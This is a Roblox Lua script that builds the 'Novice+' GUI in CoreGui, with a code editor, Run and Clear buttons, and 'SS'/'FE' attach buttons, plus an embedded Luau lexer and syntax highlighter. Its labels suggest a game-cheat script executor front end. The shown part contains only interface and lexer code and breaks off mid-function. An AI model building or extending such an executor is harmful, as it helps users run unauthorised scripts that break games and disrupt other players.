-- Gui to Lua
-- Version: 3.2

-- Instances:

local novice = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local TextLabel = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local UIListLayout = Instance.new("UIListLayout")
local UIPadding_2 = Instance.new("UIPadding")
local Window = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local UIGradient_2 = Instance.new("UIGradient")
local Executer = Instance.new("Frame")
local LuaLexer = Instance.new("ScrollingFrame")
local Source = Instance.new("TextBox")
local Lines = Instance.new("TextLabel")
local UIPadding_5 = Instance.new("UIPadding")
local Frame_3 = Instance.new("Frame")
local Run_2 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local UIPadding_6 = Instance.new("UIPadding")
local right_2 = Instance.new("ImageLabel")
local UIListLayout_2 = Instance.new("UIListLayout")
local Clear = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local UIPadding_7 = Instance.new("UIPadding")
local clear = Instance.new("ImageLabel")
local Scritps = Instance.new("Frame")
local UIPadding_8 = Instance.new("UIPadding")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UICorner_8 = Instance.new("UICorner")
local UIListLayout_3 = Instance.new("UIListLayout")


local Frame_4 = Instance.new("Frame")
local UICorner_10 = Instance.new("UICorner")
local UIPadding_9 = Instance.new("UIPadding")
local right_3 = Instance.new("ImageLabel")
local UIListLayout_4 = Instance.new("UIListLayout")
local Clear_2 = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local UIPadding_10 = Instance.new("UIPadding")
local opacity = Instance.new("ImageLabel")
local Attacher = Instance.new("Frame")
local UIPadding_11 = Instance.new("UIPadding")
local Classic = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local UIGradient_4 = Instance.new("UIGradient")
local Revamped = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local UIGradient_5 = Instance.new("UIGradient")
local FE = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local UIGradient_6 = Instance.new("UIGradient")
local UITableLayout = Instance.new("UITableLayout")
local ScreenGui = Instance.new("ScreenGui")

--Properties:

novice.Name = "novice+"
novice.Parent = game.CoreGui
novice.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = novice
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.Position = UDim2.new(0.323327065, 0, -0.0113895219, 0)
Frame.Size = UDim2.new(0, 564, 0, 68)

UICorner.CornerRadius = UDim.new(0, 7)
UICorner.Parent = Frame

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(166, 166, 166))}
UIGradient.Rotation = 50
UIGradient.Parent = Frame

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0, 0, 0.220588237, 0)
TextLabel.Size = UDim2.new(0.0140845114, 100, 0.522058845, 0)
TextLabel.Font = Enum.Font.GothamMedium
TextLabel.Text = "Novice+"
TextLabel.TextColor3 = Color3.fromRGB(194, 194, 194)
TextLabel.TextScaled = true
TextLabel.TextSize = 20.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextWrapped = true

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BackgroundTransparency = 1.000
Frame_2.Position = UDim2.new(0.248826295, 0, 0, 0)
Frame_2.Size = UDim2.new(0, 320, 1, 0)




UIListLayout.Parent = Frame_2
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout.Padding = UDim.new(0, 10)

UIPadding_2.Parent = Frame_2
UIPadding_2.PaddingBottom = UDim.new(0, 2)
UIPadding_2.PaddingLeft = UDim.new(0, 10)

Window.Name = "Window"
Window.Parent = Frame
Window.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Window.Position = UDim2.new(0, 0, 1, 10)
Window.Size = UDim2.new(1, 0, 3.7352941, 0)
Window.Visible = false

UICorner_5.CornerRadius = UDim.new(0, 7)
UICorner_5.Parent = Window

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(166, 166, 166))}
UIGradient_2.Rotation = -90
UIGradient_2.Parent = Window

Executer.Name = "Executer"
Executer.Parent = Window
Executer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Executer.BackgroundTransparency = 1.000
Executer.Size = UDim2.new(1, 0, 1, 0)
Executer.Visible = false

LuaLexer.Name = "LuaLexer"
LuaLexer.Parent = Executer
LuaLexer.Active = true
LuaLexer.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
LuaLexer.BorderColor3 = Color3.fromRGB(61, 61, 61)
LuaLexer.Size = UDim2.new(1, 0, 1, 0)
LuaLexer.ZIndex = 3
LuaLexer.CanvasSize = UDim2.new(1, 0, 1000, 0)
LuaLexer.AutomaticCanvasSize = Enum.AutomaticSize.X

Source.Name = "Source"
Source.Parent = LuaLexer
Source.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Source.BackgroundTransparency = 1.000
Source.Position = UDim2.new(0, 30, 0, 0)
Source.Size = UDim2.new(1, 0, 1, 0)
Source.ZIndex = 3
Source.ClearTextOnFocus = false
Source.Font = Enum.Font.Code
Source.MultiLine = true
Source.PlaceholderColor3 = Color3.fromRGB(204, 204, 204)
Source.Text = "--Thank you for using novice+. Not all of the FE scripts have been tested proprely by the way"
Source.TextColor3 = Color3.fromRGB(204, 204, 204)
Source.TextSize = 15.000
Source.TextWrapped = false
Source.TextXAlignment = Enum.TextXAlignment.Left
Source.TextYAlignment = Enum.TextYAlignment.Top
Source.AutomaticSize = Enum.AutomaticSize.X

Lines.Name = "Lines"
Lines.Parent = LuaLexer
Lines.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Lines.BackgroundTransparency = 1.000
Lines.Size = UDim2.new(0, 30, 1, 0)
Lines.ZIndex = 4
Lines.Font = Enum.Font.Code
Lines.Text = "1"
Lines.TextColor3 = Color3.fromRGB(255, 255, 255)
Lines.TextSize = 15.000
Lines.TextYAlignment = Enum.TextYAlignment.Top


UIPadding_5.Parent = Executer
UIPadding_5.PaddingBottom = UDim.new(0, 10)
UIPadding_5.PaddingLeft = UDim.new(0, 10)
UIPadding_5.PaddingRight = UDim.new(0, 10)
UIPadding_5.PaddingTop = UDim.new(0, 10)

Frame_3.Parent = Executer
Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_3.BackgroundTransparency = 1.000
Frame_3.Position = UDim2.new(0, 0, 1, 25)
Frame_3.Size = UDim2.new(1, 0, 0, 25)

Run_2.Name = "Run"
Run_2.Parent = Frame_3
Run_2.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
Run_2.Position = UDim2.new(0, 0, 1.22649574, -35)
Run_2.Size = UDim2.new(0, 35, 0, 35)
Run_2.Text = ""

UICorner_6.Parent = Run_2

UIPadding_6.Parent = Run_2
UIPadding_6.PaddingBottom = UDim.new(0, 5)
UIPadding_6.PaddingLeft = UDim.new(0, 5)
UIPadding_6.PaddingRight = UDim.new(0, 5)
UIPadding_6.PaddingTop = UDim.new(0, 5)

right_2.Name = "right"
right_2.Parent = Run_2
right_2.Active = true
right_2.BackgroundTransparency = 1.000
right_2.LayoutOrder = 8
right_2.Selectable = true
right_2.Size = UDim2.new(1, 0, 1, 0)
right_2.ZIndex = 2
right_2.Image = "rbxassetid://6764432408"
right_2.ImageColor3 = Color3.fromRGB(194, 194, 194)
right_2.ImageRectOffset = Vector2.new(100, 150)
right_2.ImageRectSize = Vector2.new(50, 50)

UIListLayout_2.Parent = Frame_3
UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout_2.Padding = UDim.new(0, 10)

Clear.Name = "Clear"
Clear.Parent = Frame_3
Clear.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
Clear.Position = UDim2.new(0, 0, 1.22649574, -35)
Clear.Size = UDim2.new(0, 35, 0, 35)
Clear.Text = ""

UICorner_7.Parent = Clear

UIPadding_7.Parent = Clear
UIPadding_7.PaddingBottom = UDim.new(0, 5)
UIPadding_7.PaddingLeft = UDim.new(0, 5)
UIPadding_7.PaddingRight = UDim.new(0, 5)
UIPadding_7.PaddingTop = UDim.new(0, 5)

clear.Name = "clear"
clear.Parent = Clear
clear.Active = true
clear.BackgroundTransparency = 1.000
clear.LayoutOrder = 5
clear.Selectable = true
clear.Size = UDim2.new(1, 0, 1, 0)
clear.ZIndex = 2
clear.Image = "rbxassetid://3926305904"
clear.ImageColor3 = Color3.fromRGB(194, 194, 194)
clear.ImageRectOffset = Vector2.new(924, 724)
clear.ImageRectSize = Vector2.new(36, 36)

Scritps.Name = "Scritps"
Scritps.Parent = Window
Scritps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Scritps.BackgroundTransparency = 1.000
Scritps.Size = UDim2.new(1, 0, 1, 0)
Scritps.Visible = false

UIPadding_8.Parent = Scritps
UIPadding_8.PaddingBottom = UDim.new(0, 10)
UIPadding_8.PaddingLeft = UDim.new(0, 10)
UIPadding_8.PaddingRight = UDim.new(0, 10)
UIPadding_8.PaddingTop = UDim.new(0, 10)

ScrollingFrame.Parent = Scritps
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
ScrollingFrame.ZIndex = 2
ScrollingFrame.BottomImage = "rbxassetid://5614579544"
ScrollingFrame.MidImage = "rbxassetid://5614579544"
ScrollingFrame.TopImage = "rbxassetid://5614579544"
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

UICorner_8.CornerRadius = UDim.new(0, 5)
UICorner_8.Parent = ScrollingFrame

UIListLayout_3.Parent = ScrollingFrame
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 5)



Frame_4.Parent = Scritps
Frame_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_4.BackgroundTransparency = 1.000
Frame_4.Position = UDim2.new(0, 0, 1, 25)
Frame_4.Size = UDim2.new(1, 0, 0, 25)



UIListLayout_4.Parent = Frame_4
UIListLayout_4.FillDirection = Enum.FillDirection.Horizontal
UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_4.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout_4.Padding = UDim.new(0, 10)

Clear_2.Name = "Clear"
Clear_2.Parent = Frame_4
Clear_2.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
Clear_2.Position = UDim2.new(0, 0, 1.22649574, -35)
Clear_2.Size = UDim2.new(0, 35, 0, 35)
Clear_2.Text = ""

UICorner_11.Parent = Clear_2

UIPadding_10.Parent = Clear_2
UIPadding_10.PaddingBottom = UDim.new(0, 5)
UIPadding_10.PaddingLeft = UDim.new(0, 5)
UIPadding_10.PaddingRight = UDim.new(0, 5)
UIPadding_10.PaddingTop = UDim.new(0, 5)

opacity.Name = "opacity"
opacity.Parent = Clear_2
opacity.Active = true
opacity.BackgroundTransparency = 1.000
opacity.LayoutOrder = 5
opacity.Selectable = true
opacity.Size = UDim2.new(1, 0, 1, 0)
opacity.ZIndex = 2
opacity.Image = "rbxassetid://3926305904"
opacity.ImageColor3 = Color3.fromRGB(194, 194, 194)
opacity.ImageRectOffset = Vector2.new(884, 564)
opacity.ImageRectSize = Vector2.new(36, 36)

Attacher.Name = "Attacher"
Attacher.Parent = Window
Attacher.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Attacher.BackgroundTransparency = 1.000
Attacher.Size = UDim2.new(1, 0, 1, 0)
Attacher.Visible = false

UIPadding_11.Parent = Attacher
UIPadding_11.PaddingBottom = UDim.new(0, 10)
UIPadding_11.PaddingLeft = UDim.new(0, 10)
UIPadding_11.PaddingRight = UDim.new(0, 10)
UIPadding_11.PaddingTop = UDim.new(0, 10)

Classic.Name = "Classic"
Classic.Parent = Attacher
Classic.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
Classic.ClipsDescendants = true
Classic.Size = UDim2.new(0, 200, 0, 50)
Classic.Font = Enum.Font.GothamMedium
Classic.Text = "SS Classic"
Classic.TextColor3 = Color3.fromRGB(255, 255, 255)
Classic.TextSize = 25.000
Classic.TextWrapped = true

UICorner_12.Parent = Classic

UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(152, 152, 152))}
UIGradient_4.Rotation = 90
UIGradient_4.Parent = Classic

Revamped.Name = "Revamped"
Revamped.Parent = Attacher
Revamped.BackgroundColor3 = Color3.fromRGB(85, 85, 255)
Revamped.ClipsDescendants = true
Revamped.Size = UDim2.new(0, 200, 0, 50)
Revamped.Font = Enum.Font.GothamMedium
Revamped.Text = "SS Revamped"
Revamped.TextColor3 = Color3.fromRGB(255, 255, 255)
Revamped.TextSize = 25.000
Revamped.TextWrapped = true

UICorner_13.Parent = Revamped

UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(152, 152, 152))}
UIGradient_5.Rotation = 90
UIGradient_5.Parent = Revamped

FE.Name = "FE"
FE.Parent = Attacher
FE.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
FE.ClipsDescendants = true
FE.Size = UDim2.new(0, 200, 0, 50)
FE.Font = Enum.Font.GothamMedium
FE.Text = "Novice FE"
FE.TextColor3 = Color3.fromRGB(255, 255, 255)
FE.TextSize = 25.000
FE.TextWrapped = true

UICorner_14.Parent = FE

UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(152, 152, 152))}
UIGradient_6.Rotation = 90
UIGradient_6.Parent = FE

UITableLayout.Parent = Attacher
UITableLayout.FillDirection = Enum.FillDirection.Horizontal
UITableLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UITableLayout.SortOrder = Enum.SortOrder.LayoutOrder
UITableLayout.VerticalAlignment = Enum.VerticalAlignment.Center
UITableLayout.FillEmptySpaceColumns = true
UITableLayout.FillEmptySpaceRows = true
UITableLayout.Padding = UDim2.new(0, 25, 0, 0)

ScreenGui.Parent = Frame
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Module Scripts:
local function language()
	local language = {
		keyword = {
			["and"] = true,
			["break"] = true,
			["continue"] = true,
			["do"] = true,
			["else"] = true,
			["elseif"] = true,
			["end"] = true,
			["export"] = true,
			["false"] = true,
			["for"] = true,
			["function"] = true,
			["if"] = true,
			["in"] = true,
			["local"] = true,
			["nil"] = true,
			["not"] = true,
			["or"] = true,
			["repeat"] = true,
			["return"] = true,
			["self"] = true,
			["then"] = true,
			["true"] = true,
			["type"] = true,
			["typeof"] = true,
			["until"] = true,
			["while"] = true,
		},

		builtin = {
			-- Luau Functions
			["assert"] = true,
			["error"] = true,
			["getfenv"] = true,
			["getmetatable"] = true,
			["ipairs"] = true,
			["loadstring"] = true,
			["newproxy"] = true,
			["next"] = true,
			["pairs"] = true,
			["pcall"] = true,
			["print"] = true,
			["rawequal"] = true,
			["rawget"] = true,
			["rawset"] = true,
			["select"] = true,
			["setfenv"] = true,
			["setmetatable"] = true,
			["tonumber"] = true,
			["tostring"] = true,
			["unpack"] = true,
			["xpcall"] = true,

			-- Luau Functions (Deprecated)
			["collectgarbage"] = true,

			-- Luau Variables
			["_G"] = true,
			["_VERSION"] = true,

			-- Luau Tables
			["bit32"] = true,
			["coroutine"] = true,
			["debug"] = true,
			["math"] = true,
			["os"] = true,
			["string"] = true,
			["table"] = true,
			["utf8"] = true,

			-- Roblox Functions
			["DebuggerManager"] = true,
			["delay"] = true,
			["gcinfo"] = true,
			["PluginManager"] = true,
			["require"] = true,
			["settings"] = true,
			["spawn"] = true,
			["tick"] = true,
			["time"] = true,
			["UserSettings"] = true,
			["wait"] = true,
			["warn"] = true,

			-- Roblox Functions (Deprecated)
			["Delay"] = true,
			["ElapsedTime"] = true,
			["elapsedTime"] = true,
			["printidentity"] = true,
			["Spawn"] = true,
			["Stats"] = true,
			["stats"] = true,
			["Version"] = true,
			["version"] = true,
			["Wait"] = true,
			["ypcall"] = true,

			-- Roblox Variables
			["File"] = true,
			["game"] = true,
			["plugin"] = true,
			["script"] = true,
			["shared"] = true,
			["workspace"] = true,

			-- Roblox Variables (Deprecated)
			["Game"] = true,
			["Workspace"] = true,

			-- Roblox Tables
			["Axes"] = true,
			["BrickColor"] = true,
			["CatalogSearchParams"] = true,
			["CFrame"] = true,
			["Color3"] = true,
			["ColorSequence"] = true,
			["ColorSequenceKeypoint"] = true,
			["DateTime"] = true,
			["DockWidgetPluginGuiInfo"] = true,
			["Enum"] = true,
			["Faces"] = true,
			["FloatCurveKey"] = true,
			["Font"] = true,
			["Instance"] = true,
			["NumberRange"] = true,
			["NumberSequence"] = true,
			["NumberSequenceKeypoint"] = true,
			["OverlapParams"] = true,
			["PathWaypoint"] = true,
			["PhysicalProperties"] = true,
			["Random"] = true,
			["Ray"] = true,
			["RaycastParams"] = true,
			["Rect"] = true,
			["Region3"] = true,
			["Region3int16"] = true,
			["RotationCurveKey"] = true,
			["task"] = true,
			["TweenInfo"] = true,
			["UDim"] = true,
			["UDim2"] = true,
			["Vector2"] = true,
			["Vector2int16"] = true,
			["Vector3"] = true,
			["Vector3int16"] = true,
		},

		libraries = {

			-- Luau Libraries
			bit32 = {
				arshift = true,
				band = true,
				bnot = true,
				bor = true,
				btest = true,
				bxor = true,
				countlz = true,
				countrz = true,
				extract = true,
				lrotate = true,
				lshift = true,
				replace = true,
				rrotate = true,
				rshift = true,
			},

			coroutine = {
				close = true,
				create = true,
				isyieldable = true,
				resume = true,
				running = true,
				status = true,
				wrap = true,
				yield = true,
			},

			debug = {
				dumpheap = true,
				info = true,
				loadmodule = true,
				profilebegin = true,
				profileend = true,
				resetmemorycategory = true,
				setmemorycategory = true,
				traceback = true,
			},

			math = {
				abs = true,
				acos = true,
				asin = true,
				atan2 = true,
				atan = true,
				ceil = true,
				clamp = true,
				cos = true,
				cosh = true,
				deg = true,
				exp = true,
				floor = true,
				fmod = true,
				frexp = true,
				ldexp = true,
				log10 = true,
				log = true,
				max = true,
				min = true,
				modf = true,
				noise = true,
				pow = true,
				rad = true,
				random = true,
				randomseed = true,
				round = true,
				sign = true,
				sin = true,
				sinh = true,
				sqrt = true,
				tan = true,
				tanh = true,

				huge = true,
				pi = true,
			},

			os = {
				clock = true,
				date = true,
				difftime = true,
				time = true,
			},

			string = {
				byte = true,
				char = true,
				find = true,
				format = true,
				gmatch = true,
				gsub = true,
				len = true,
				lower = true,
				match = true,
				pack = true,
				packsize = true,
				rep = true,
				reverse = true,
				split = true,
				sub = true,
				unpack = true,
				upper = true,
			},

			table = {
				clear = true,
				clone = true,
				concat = true,
				create = true,
				find = true,
				foreach = true,
				foreachi = true,
				freeze = true,
				getn = true,
				insert = true,
				isfrozen = true,
				maxn = true,
				move = true,
				pack = true,
				remove = true,
				sort = true,
				unpack = true,
			},

			utf8 = {
				char = true,
				codepoint = true,
				codes = true,
				graphemes = true,
				len = true,
				nfcnormalize = true,
				nfdnormalize = true,
				offset = true,

				charpattern = true,
			},

			-- Roblox Libraries
			Axes = {
				new = true,
			},

			BrickColor = {
				Black = true,
				Blue = true,
				DarkGray = true,
				Gray = true,
				Green = true,
				new = true,
				New = true,
				palette = true,
				Random = true,
				random = true,
				Red = true,
				White = true,
				Yellow = true,
			},

			CatalogSearchParams = {
				new = true,
			},

			CFrame = {
				Angles = true,
				fromAxisAngle = true,
				fromEulerAngles = true,
				fromEulerAnglesXYZ = true,
				fromEulerAnglesYXZ = true,
				fromMatrix = true,
				fromOrientation = true,
				lookAt = true,
				new = true,

				identity = true,
			},

			Color3 = {
				fromHex = true,
				fromHSV = true,
				fromRGB = true,
				new = true,
				toHSV = true,
			},

			ColorSequence = {
				new = true,
			},

			ColorSequenceKeypoint = {
				new = true,
			},

			DateTime = {
				fromIsoDate = true,
				fromLocalTime = true,
				fromUniversalTime = true,
				fromUnixTimestamp = true,
				fromUnixTimestampMillis = true,
				now = true,
			},

			DockWidgetPluginGuiInfo = {
				new = true,
			},

			Enum = {},

			Faces = {
				new = true,
			},

			FloatCurveKey = {
				new = true,
			},

			Font = {
				fromEnum = true,
				new = true,
			},

			Instance = {
				new = true,
			},

			NumberRange = {
				new = true,
			},

			NumberSequence = {
				new = true,
			},

			NumberSequenceKeypoint = {
				new = true,
			},

			OverlapParams = {
				new = true,
			},

			PathWaypoint = {
				new = true,
			},

			PhysicalProperties = {
				new = true,
			},

			Random = {
				new = true,
			},

			Ray = {
				new = true,
			},

			RaycastParams = {
				new = true,
			},

			Rect = {
				new = true,
			},

			Region3 = {
				new = true,
			},

			Region3int16 = {
				new = true,
			},

			RotationCurveKey = {
				new = true,
			},

			task = {
				cancel = true,
				defer = true,
				delay = true,
				desynchronize = true,
				spawn = true,
				synchronize = true,
				wait = true,
			},

			TweenInfo = {
				new = true,
			},

			UDim = {
				new = true,
			},

			UDim2 = {
				fromOffset = true,
				fromScale = true,
				new = true,
			},

			Vector2 = {
				new = true,

				one = true,
				xAxis = true,
				yAxis = true,
				zero = true,
			},

			Vector2int16 = {
				new = true,
			},

			Vector3 = {
				fromAxis = true,
				FromAxis = true,
				fromNormalId = true,
				FromNormalId = true,
				new = true,

				one = true,
				xAxis = true,
				yAxis = true,
				zAxis = true,
				zero = true,
			},

			Vector3int16 = {
				new = true,
			},
		},
	}

	-- Filling up language.libraries.Enum table 
	local enumLibraryTable = language.libraries.Enum

	for _, enum in ipairs(Enum:GetEnums()) do
		enumLibraryTable[tostring(enum)] = true --TODO: Remove tostring from here once there is a better way to get the name of an Enum
	end

	return language
end
local function Lexer()
		--[=[
			Lexical scanner for creating a sequence of tokens from Lua source code.
			This is a heavily modified and Roblox-optimized version of
			the original Penlight Lexer module:
				https://github.com/stevedonovan/Penlight
			Authors:
				stevedonovan <https://github.com/stevedonovan> ----------- Original Penlight lexer author
				ryanjmulder <https://github.com/ryanjmulder> ------------- Penlight lexer contributer
				mpeterv <https://github.com/mpeterv> --------------------- Penlight lexer contributer
				Tieske <https://github.com/Tieske> ----------------------- Penlight lexer contributer
				boatbomber <https://github.com/boatbomber> --------------- Roblox port, added builtin token,
				                                                           added patterns for incomplete syntax, bug fixes,
				                                                           behavior changes, token optimization, thread optimization
				                                                           Added lexer.navigator() for non-sequential reads
				Sleitnick <https://github.com/Sleitnick> ----------------- Roblox optimizations
				howmanysmall <https://github.com/howmanysmall> ----------- Lua + Roblox optimizations
		
			List of possible tokens:
				- iden
				- keyword
				- builtin
				- string
				- number
				- comment
				- operator
		--]=]

	local lexer = {}

	local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
	local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
	local NUMBER_A = "0x[%da-fA-F]+"
	local NUMBER_B = "%d+%.?%d*[eE][%+%-]?%d+"
	local NUMBER_C = "%d+[%._]?[%d_eE]*"
	local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
	local BRACKETS = "[%[%]]+" -- needs to be separate pattern from other operators or it'll mess up multiline strings
	local IDEN = "[%a_][%w_]*"
	local STRING_EMPTY = "(['\"])%1" --Empty String
	local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)" --TODO: Handle escaping escapes
	local STRING_INCOMP_A = "(['\"]).-\n" --Incompleted String with next line
	local STRING_INCOMP_B = "(['\"])[^\n]*" --Incompleted String without next line
	local STRING_MULTI = "%[(=*)%[.-%]%1%]" --Multiline-String
	local STRING_MULTI_INCOMP = "%[=*%[.-.*" --Incompleted Multiline-String
	local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]" --Completed Multiline-Comment
	local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*" --Incompleted Multiline-Comment
	local COMMENT_PLAIN = "%-%-.-\n" --Completed Singleline-Comment
	local COMMENT_INCOMP = "%-%-.*" --Incompleted Singleline-Comment
	-- local TYPED_VAR = ":%s*([%w%?%| \t]+%s*)" --Typed variable, parameter, function

	local lang = language()
	local lua_keyword = lang.keyword
	local lua_builtin = lang.builtin
	local lua_libraries = lang.libraries

	local lua_matches = {
		-- Indentifiers
		{ Prefix .. IDEN .. Suffix, "var" },

		-- Numbers
		{ Prefix .. NUMBER_A .. Suffix, "number" },
		{ Prefix .. NUMBER_B .. Suffix, "number" },
		{ Prefix .. NUMBER_C .. Suffix, "number" },

		-- Strings
		{ Prefix .. STRING_EMPTY .. Suffix, "string" },
		{ Prefix .. STRING_PLAIN .. Suffix, "string" },
		{ Prefix .. STRING_INCOMP_A .. Suffix, "string" },
		{ Prefix .. STRING_INCOMP_B .. Suffix, "string" },
		{ Prefix .. STRING_MULTI .. Suffix, "string" },
		{ Prefix .. STRING_MULTI_INCOMP .. Suffix, "string" },

		-- Comments
		{ Prefix .. COMMENT_MULTI .. Suffix, "comment" },
		{ Prefix .. COMMENT_MULTI_INCOMP .. Suffix, "comment" },
		{ Prefix .. COMMENT_PLAIN .. Suffix, "comment" },
		{ Prefix .. COMMENT_INCOMP .. Suffix, "comment" },

		-- Operators
		{ Prefix .. OPERATORS .. Suffix, "operator" },
		{ Prefix .. BRACKETS .. Suffix, "operator" },

		-- Unicode
		{ Prefix .. UNICODE .. Suffix, "iden" },

		-- Unknown
		{ "^.", "iden" },
	}

	--- Create a plain token iterator from a string.
	-- @tparam string s a string.

	function lexer.scan(s: string)
		-- local startTime = os.clock()
		lexer.finished = false

		local index = 1
		local sz = #s
		local p1, p2, p3, pT = "", "", "", ""

		return function()
			if index <= sz then
				for _, m in ipairs(lua_matches) do
					local i1, i2 = string.find(s, m[1], index)
					if i1 then
						local tok = string.sub(s, i1, i2)
						index = i2 + 1
						lexer.finished = index > sz
						--if lexer.finished then
						--	print((os.clock()-startTime)*1000, "ms")
						--end

						local t = m[2]
						local t2 = t

						-- Process t into t2
						if t == "var" then
							-- Since we merge spaces into the tok, we need to remove them
							-- in order to check the actual word it contains
							local cleanTok = string.gsub(tok, Cleaner, "")

							if lua_keyword[cleanTok] then
								t2 = "keyword"
							elseif lua_builtin[cleanTok] then
								t2 = "builtin"
							else
								t2 = "iden"
							end

							if string.find(p1, "%.[%s%c]*$") and pT ~= "comment" then
								-- The previous was a . so we need to special case indexing things
								local parent = string.gsub(p2, Cleaner, "")
								local lib = lua_libraries[parent]
								if lib and lib[cleanTok] and not string.find(p3, "%.[%s%c]*$") then
									-- Indexing a builtin lib with existing item, treat as a builtin
									t2 = "builtin"
								else
									-- Indexing a non builtin, can't be treated as a keyword/builtin
									t2 = "iden"
								end
								-- print("indexing",parent,"with",cleanTok,"as",t2)
							end
						end

						-- Record last 3 tokens for the indexing context check
						p3 = p2
						p2 = p1
						p1 = tok
						pT = t2
						return t2, tok
					end
				end
			end
		end
	end

	function lexer.navigator()
		local nav = {
			Source = "",
			TokenCache = table.create(50),

			_RealIndex = 0,
			_UserIndex = 0,
			_ScanThread = nil,
		}

		function nav:Destroy()
			self.Source = nil
			self._RealIndex = nil
			self._UserIndex = nil
			self.TokenCache = nil
			self._ScanThread = nil
		end

		function nav:SetSource(SourceString)
			self.Source = SourceString

			self._RealIndex = 0
			self._UserIndex = 0
			table.clear(self.TokenCache)

			self._ScanThread = coroutine.create(function()
				for Token, Src in lexer.scan(self.Source) do
					self._RealIndex += 1
					self.TokenCache[self._RealIndex] = { Token, Src }
					coroutine.yield(Token, Src)
				end
			end)
		end

		function nav.Next()
			nav._UserIndex += 1

			if nav._RealIndex >= nav._UserIndex then
				-- Already scanned, return cached
				return table.unpack(nav.TokenCache[nav._UserIndex])
			else
				if coroutine.status(nav._ScanThread) == "dead" then
					-- Scan thread dead
					return
				else
					local success, token, src = coroutine.resume(nav._ScanThread)
					if success and token then
						-- Scanned new data
						return token, src
					else
						-- Lex completed
						return
					end
				end
			end
		end

		function nav.Peek(PeekAmount)
			local GoalIndex = nav._UserIndex + PeekAmount

			if nav._RealIndex >= GoalIndex then
				-- Already scanned, return cached
				if GoalIndex > 0 then
					return table.unpack(nav.TokenCache[GoalIndex])
				else
					-- Invalid peek
					return
				end
			else
				if coroutine.status(nav._ScanThread) == "dead" then
					-- Scan thread dead
					return
				else
					local IterationsAway = GoalIndex - nav._RealIndex

					local success, token, src = nil, nil, nil

					for _ = 1, IterationsAway do
						success, token, src = coroutine.resume(nav._ScanThread)
						if not (success or token) then
							-- Lex completed
							break
						end
					end

					return token, src
				end
			end
		end

		return nav
	end

	return lexer
end

local function Highlighter()

	TokenColors = {}
	TokenFormats = {}
	ActiveLabels = {}
	LastText = {}
	Cleanups = {}

	local function SanitizeRichText(s: string): string
		return string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(s,
			"&", "&amp;"),
			"<", "&lt;"),
			">", "&gt;"),
